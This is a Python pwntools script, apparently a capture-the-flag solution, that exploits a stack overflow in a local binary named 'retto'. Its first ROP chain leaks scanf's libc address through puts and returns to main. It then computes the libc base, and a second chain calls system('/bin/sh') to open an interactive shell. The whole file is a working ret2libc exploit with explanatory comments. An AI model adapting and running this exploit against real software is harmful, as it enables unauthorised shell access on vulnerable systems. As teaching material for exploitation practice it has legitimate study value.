#! /usr/bin/env python3

from pwn import *

#stored as an elf object so we can search the binary for needed address or grab values from addresses
rettoELF = ELF('./retto') 

#just like the binary above we can do this to search through libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#create a ROP object which allows us to look up symbols in the binary
rettoROP = ROP(rettoELF)

target = process('./retto')

padding = b'A' * 0x38 #padding up to the instruction pointer


# 1st ROP chain will consist of padding, pop rdi, address of scanf from GOT which we want leaked, call the puts function, and then return to main
payload = padding
payload += p64(rettoROP.find_gadget(['pop rdi', 'ret'])[0]) #find a list of pop rdi gadgets and grabs the first one
payload += p64(rettoELF.got.__isoc99_scanf) #finds scanf from the Global Offset Table (GOT) and places the address into rdi to be leaked
payload += p64(rettoELF.plt.puts) #call puts from the procedural linkage table to print out the leaked address from the GOT
payload += p64(rettoELF.symbols.main) #finds main to jump back to the beginning
target.sendlineafter(b'here?', payload) #this will send the payload after the prompted question

#save the leaked address
target.recvline() #didnt need this line
leak = u64(target.recvline().strip().ljust(8, b'\0')) #save the leaked address and unpack it (ljust bc its little endian)

log.info(f'{hex(leak)}') #print out the status message for leaked address


#calculate the base address
libc.address = leak - libc.symbols.__isoc99_scanf #calculate base libc by subtracting the leaked scanf by the offset given in libc.symbols
log.info (f'Libc base => {hex(libc.address)}') ##print out the status message for libc base address (should end in 000)


# 2nd ROP Chain padding, pop rdi, reference to /bin/sh, ret for stack alignment, call system
payload = padding
payload += p64(rettoROP.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh'))) # searches libc for the next /bin/sh string and is placed in the rdi register
payload += p64(rettoROP.find_gadget(['ret'])[0]) # needed for stack alignment
payload += p64(libc.symbols.system) # calls system from libc with /bin/sh as its arguement which will drop to a shell, this is only possible since we calculated the base address of libc!


target.sendline(payload) # send payload again for shell

target.interactive()
